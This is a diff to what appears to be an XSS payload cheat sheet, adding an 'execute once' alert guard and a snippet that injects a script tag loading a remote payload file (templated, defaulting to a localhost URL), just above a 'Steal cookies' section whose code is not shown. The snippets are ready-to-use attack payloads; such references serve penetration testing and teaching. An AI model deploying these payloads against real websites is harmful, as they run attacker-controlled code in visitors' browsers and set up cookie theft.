@@ -15,6 +15,20 @@ badge: Web
 
 ### Exploitation
 
+#### Execute once only
+
+Useful when the payload is reflected on multiple fields. Mainly to avoid popping 3000 alerts when testing.
+
+```js
+if (window.{{ js-exec-flag _trickz }} === undefined){{{ js-exec-once alert(1) }};window.{{ js-exec-flag _trickz }} = 1}
+```
+
+#### Load Script file
+
+```js
+var a=document.createElement("script");a.src="{{ js-payload-url http://localhost:8000/xss.js }}";document.body.appendChild(a);
+```
+
 #### Steal cookies
 
 ```js
